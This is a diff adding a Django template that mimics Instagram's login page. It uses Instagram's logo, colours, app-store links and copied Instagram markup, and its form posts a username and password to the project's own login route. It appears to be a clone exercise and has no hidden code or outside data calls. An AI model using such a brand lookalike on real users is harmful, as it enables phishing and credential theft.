@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', sans-serif;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+        }
+        .container {
+            display: flex;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 50px;
+            border-radius: 20px;
+            box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        .phone-container img {
+            height: 550px;
+        }
+        .login-container {
+            background: #fff;
+            padding: 40px;
+            width: 400px;
+            text-align: center;
+            border-radius: 12px;
+            box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.15);
+            transition: transform 0.3s;
+        }
+        .login-container:hover {
+            transform: scale(1.02);
+        }
+        .login-container img {
+            width: 220px;
+            margin-bottom: 30px;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 12px 0;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: 0.3s;
+        }
+        input:focus {
+            border-color: #833ab4;
+            outline: none;
+            box-shadow: 0px 0px 10px rgba(131, 58, 180, 0.5);
+        }
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #833ab4, #fd1d1d);
+            border: none;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 10px;
+            font-size: 18px;
+            transition: 0.3s;
+        }
+        .login-btn:hover {
+            background: linear-gradient(135deg, #fd1d1d, #fcb045);
+        }
+        .forgot-password {
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        .signup-container {
+            margin-top: 20px;
+            padding: 18px;
+            border: 1px solid #ddd;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.1);
+        }
+        .app-links {
+            margin-top: 30px;
+        }
+        .app-links img {
+            width: 160px;
+            margin: 10px;
+            transition: transform 0.3s;
+        }
+        .app-links img:hover {
+            transform: scale(1.1);
+        }
+        a {
+            text-decoration: none;
+            color: #833ab4;
+            font-weight: bold;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="phone-container">
+            <img src="https://th.bing.com/th?q=Original+Instagram+Logo&w=120&h=120&c=1&rs=1&qlt=90&cb=1&pid=InlineBlock&mkt=en-IN&cc=IN&setlang=en&adlt=moderate&t=1&mw=247"  alt="Instagram Mobile" style="padding-right: 50px; width: 500PX; height: 500PX;">
+        </div>
+        <div>
+            <div class="login-container">
+                <img src="https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo.png" alt="Instagram">
+                <form method="POST" action="{% url 'login' %}">
+                {% csrf_token %}
+                <input type="text" placeholder="username" name="username" required>
+                <input type="password" placeholder="Password" name="password" required>
+                <button type="submit" class="login-btn">Log In</button>
+                </form>
+                <p class="forgot-password"><a href="#">Forgot Password?</a></p>
+            </div>
+            <div class="signup-container">
+                <p>Don't have an account? <a href="{% url 'register' %}
+                    ">Sign up</a></p>
+            </div>
+            <div class="app-links">
+                <p>Get the app.</p>
+                <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank">
+                    <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store">
+                </a>
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
+                    <img src="https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png" alt="Google Play">
+                </a>
+            </div>
+        </div>
+    </div>
+    <div class="xamitd3 xm2v1qs x322q5f xx54hvc x1vk3w4 xuyhj88 xod5an3 x1gja9t xv4oxz2 xkxfa8k"><div class="x1qjc9v5 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdt5ytf x2lah0s xk390pu x18mmtl5 x1rcfgkt xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x11njtxf"><img alt="" class="x972fbf xcfux6l x1qhh985 xm0m39n xk390pu xns55qn xu96u03 xdj266r x11i5rnm xat24cr x1mh8g0r xg01cxk xexx8yu x4uap5 x18d9i69 xkhd6sd x10l6tqk x13vifvy x11njtxf xlshs6z xqyf9gi" src="/images/instagram/xig/homepage/screenshots/screenshot1-2x.png?_d=www"><img alt="" class="x972fbf xcfux6l x1qhh985 xm0m39n xk390pu xns55qn xu96u03 xdj266r x11i5rnm xat24cr x1mh8g0r xg01cxk xexx8yu x4uap5 x18d9i69 xkhd6sd x10l6tqk x13vifvy x11njtxf xlshs6z xqyf9gi" src="/images/instagram/xig/homepage/screenshots/screenshot2-2x.png?d=www"><img alt="" class="x972fbf xcfux6l x1qhh985 xm0m39n xk390pu xns55qn xu96u03 xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x10l6tqk x13vifvy x11njtxf xqyf9gi xg01cxk x1rkc77x x19991ni x9lcvmn xnpuxes" src="/images/instagram/xig/homepage/screenshots/screenshot3-2x.png?d=www"><img alt="" class="x972fbf xcfux6l x1qhh985 xm0m39n xk390pu xns55qn xu96u03 xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x10l6tqk x13vifvy x11njtxf xqyf9gi x1hc1fzr x1rkc77x x19991ni x1lizcpb xnpuxes xhtitgo" src="/images/instagram/xig/homepage/screenshots/screenshot4-2x.png?_d=www"></div></div>
+</body>
+</html>
